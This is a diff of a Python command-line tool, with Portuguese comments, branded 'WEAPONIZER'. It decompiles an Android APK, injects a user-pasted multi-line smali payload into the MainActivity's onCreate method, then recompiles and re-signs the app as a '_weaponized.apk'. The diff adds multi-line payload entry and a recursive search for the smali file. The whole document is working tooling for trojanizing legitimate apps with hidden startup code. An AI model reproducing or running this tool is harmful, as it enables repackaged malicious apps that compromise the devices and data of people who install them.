@@ -5,7 +5,7 @@ import sys
 import time
 from shutil import which
 
-# --- CONFIGURAÇÃO DE AMBIENTE ---
+# --- CONFIGURAÇÃO VISUAL ---
 RED, DARK_RED, WHITE, BOLD, RESET, YELLOW, GREEN = "\33[91m", "\33[31m", "\33[97m", "\33[1m", "\33[0m", "\33[93m", "\33[92m"
 
 def log(msg, level="info"):
@@ -22,60 +22,74 @@ def exibir_banner():
 {RED} ╚███╔███╔╝███████╗██║  ██║██║     ╚██████╔╝██║ ╚████║██║███████╗███████╗██║  ██║
 {RED}  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
 {RESET}
- {WHITE}{BOLD}WEAPONIZER PRO{RESET} | {WHITE}Mode: AUTOMATED INJECTION (Red Edition){RESET}
+ {WHITE}{BOLD}MODE: DIRECT MULTI-LINE INJECTION{RESET}
  {DARK_RED}─────────────────────────────────────────────────────────────────────────────{RESET}
     """.strip()
     print(banner)
 
+def capturar_payload():
+    """Captura múltiplas linhas de código do terminal."""
+    print(f"\n{YELLOW}[>] Cole seu payload abaixo. Para finalizar, digite {BOLD}'DONE'{RESET}{YELLOW} em uma linha nova ou pressione Ctrl+D.{RESET}")
+    print(f"{DARK_RED}--- INÍCIO DO PAYLOAD ---{RESET}")
+    lines = []
+    while True:
+        try:
+            line = input()
+            if line.strip().upper() == "DONE":
+                break
+            lines.append(line)
+        except EOFError:
+            break
+    print(f"{DARK_RED}--- FIM DO PAYLOAD ---{RESET}")
+    return "\n".join(lines)
+
 def injetar_payload_smali(project_folder):
-    """Localiza a MainActivity e injeta o código automaticamente no onCreate."""
     manifest = os.path.join(project_folder, "AndroidManifest.xml")
     if not os.path.exists(manifest):
-        log("Erro: Manifesto não encontrado!", "error"); return False
+        log("Erro: AndroidManifest.xml não encontrado!", "error"); return False
 
-    # 1. Detectar MainActivity
     with open(manifest, "r") as f:
         content = f.read()
         match = re.search(r'<activity [^>]*android:name="([^"]+)"', content)
-        if not match: log("MainActivity não detectada!", "error"); return False
+        if not match: log("MainActivity não detectada no manifesto!", "error"); return False
         main_activity = match.group(1)
 
-    # 2. Localizar Arquivo Smali
-    smali_path = os.path.join(project_folder, "smali", main_activity.replace('.', '/') + ".smali")
-    if not os.path.exists(smali_path):
-        # Tenta em smali_classes2 se não encontrar no 1
-        smali_path = os.path.join(project_folder, "smali_classes2", main_activity.replace('.', '/') + ".smali")
+    smali_filename = main_activity.replace('.', '/') + ".smali"
+    smali_path = None
+    # Busca recursiva para lidar com dex múltiplos (smali, smali_classes2, etc)
+    for root, dirs, files in os.walk(project_folder):
+        if smali_filename in os.path.join(root, smali_filename) and os.path.exists(os.path.join(root, smali_filename)):
+            smali_path = os.path.join(root, smali_filename)
+            break
     
-    if not os.path.exists(smali_path):
-        log(f"Arquivo Smali não encontrado: {smali_path}", "error"); return False
+    if not smali_path:
+        log(f"Arquivo {smali_filename} não encontrado!", "error"); return False
 
-    print(f"\n{GREEN}[!] ALVO DETECTADO:{RESET} {BOLD}{main_activity}{RESET}")
-    payload = input(f"{YELLOW}» Cole seu código de Injeção/Hook aqui:{RESET}\n{BOLD}# {RESET}").strip()
+    print(f"\n{GREEN}[+] Alvo Identificado:{RESET} {BOLD}{smali_path}{RESET}")
     
-    if not payload:
-        log("Injeção cancelada: Payload vazio.", "warn"); return False
+    payload_content = capturar_payload()
+    if not payload_content.strip():
+        log("Injeção abortada: Payload vazio.", "warn"); return False
 
-    # 3. Realizar a Injeção no onCreate
-    log("Injetando payload no ponto de Hook...", "info")
+    log("Editando código Smali para injeção do hook...", "info")
     with open(smali_path, "r") as f:
         lines = f.readlines()
 
-    new_lines = []
+    final_lines = []
     in_oncreate = False
     injected = False
 
     for line in lines:
-        new_lines.append(line)
-        # Procura o início do método onCreate
+        final_lines.append(line)
         if ".method" in line and "onCreate(Landroid/os/Bundle;)V" in line:
             in_oncreate = True
         
-        # Injeta logo após o super.onCreate ou após locals
         if in_oncreate and not injected:
+            # Injeta logo após o super.onCreate ou após definição de locals
             if "invoke-super" in line or ".locals" in line:
-                new_lines.append(f"\n    # --- WEAPONIZER INJECTION BEGIN ---\n")
-                new_lines.append(f"    {payload}\n")
-                new_lines.append(f"    # --- WEAPONIZER INJECTION END ---\n\n")
+                final_lines.append(f"\n    # --- WEAPONIZER AUTO-HOOK START ---\n")
+                final_lines.append(f"    {payload_content}\n")
+                final_lines.append(f"    # --- WEAPONIZER AUTO-HOOK END ---\n\n")
                 injected = True
         
         if ".end method" in line:
@@ -83,59 +97,57 @@ def injetar_payload_smali(project_folder):
 
     if injected:
         with open(smali_path, "w") as f:
-            f.writelines(new_lines)
-        log("Injeção realizada com sucesso no código-fonte!", "success")
+            f.writelines(final_lines)
+        log("Código injetado com sucesso!", "success")
         return True
     else:
-        log("Erro: Não foi possível localizar o método onCreate para injeção.", "error")
+        log("Falha crítica: método 'onCreate' não encontrado na MainActivity.", "error")
         return False
 
 def build_e_assinar(out):
-    """Recompila, alinha e assina o APK."""
     final_apk = f"{out}_weaponized.apk"
-    log(f"Compilando projeto '{out}'...", "info")
+    log(f"Recompilando projeto '{out}'...", "info")
     
     res = subprocess.run(["apktool", "b", out, "-o", "tmp.apk"], capture_output=True, text=True)
     if res.returncode != 0:
-        log("Erro na compilação smali!", "error")
-        print(f"{RED}Apktool Error:{RESET}\n{res.stderr}"); return
+        log("Erro de Recompilação! Verifique a sintaxe do seu payload.", "error")
+        print(f"{RED}LOG ERR:{RESET}\n{res.stderr}"); return
 
     ks = "debug.keystore"
     if not os.path.exists(ks):
-        log("Gerando Keystore...", "info")
+        log("Gerando assinatura digital...", "info")
         subprocess.run(["keytool", "-genkey", "-v", "-keystore", ks, "-alias", "dev", "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000", "-storepass", "android", "-keypass", "android", "-dname", "CN=Weaponizer"], capture_output=True)
 
-    log("Assinando e finalizando artefato...", "info")
+    log("Assinando APK e otimizando...", "info")
     subprocess.run(["apksigner", "sign", "--ks", ks, "--ks-pass", "pass:android", "--out", final_apk, "tmp.apk"])
     if os.path.exists("tmp.apk"): os.remove("tmp.apk")
     
-    log(f"PRONTO! APK Armado: {BOLD}{final_apk}{RESET}", "success")
-    input(f"\n{YELLOW}Pressione Enter para voltar ao HUD...{RESET}")
+    log(f"MISSÃO CUMPRIDA! Arquivo pronto: {BOLD}{final_apk}{RESET}", "success")
+    input(f"\n{YELLOW}Pressione Enter para retornar ao menu...{RESET}")
 
 def main():
     while True:
         exibir_banner()
         print(f" [{RED}1{RESET}] Decompile (Preparar)")
-        print(f" [{RED}2{RESET}] Auto-Inject & Build (Armar e Assinar)")
+        print(f" [{RED}2{RESET}] Auto-Inject & Rebuild (Payload Direto)")
         print(f" [{RED}3{RESET}] Sair")
         
-        op = input(f"\n {BOLD}{RED}WEAPONIZER@pentest:~# {RESET}").strip()
+        op = input(f"\n {BOLD}{RED}WEAPONIZER@terminal:~# {RESET}").strip()
         
         if op == "1":
-            path = input(f" {RED}»{RESET} Arquivo APK: ").strip()
+            path = input(f" {RED}»{RESET} Caminho do APK: ").strip()
             if os.path.exists(path):
                 out = os.path.splitext(os.path.basename(path))[0]
                 subprocess.run(["apktool", "d", path, "-o", out, "-f"])
-                log(f"Projeto descompilado na pasta: {out}", "success")
-                input("\nPressione Enter para voltar...")
-            else: log("APK não encontrado.", "error"); time.sleep(1)
+                log(f"Decompilado em: {out}", "success")
+                input("\nPronto! Pressione Enter para voltar.")
+            else: log("Arquivo não encontrado.", "error"); time.sleep(1)
 
         elif op == "2":
-            out = input(f" {RED}»{RESET} Pasta do projeto: ").strip().rstrip('/')
+            out = input(f" {RED}»{RESET} Nome da pasta do projeto: ").strip().rstrip('/')
             if os.path.isdir(out):
-                # O fluxo agora é ATÔMICO: Injeta -> Build -> Sign
-                if injetar_payload_smali(out):
-                    build_e_assinar(out)
+                if injetar_payload_smali(out): # Aqui ele pede o payload e injeta
+                    build_e_assinar(out)       # Aqui ele compila e assina
             else: log("Pasta não encontrada.", "error"); time.sleep(1)
         
         elif op == "3": break
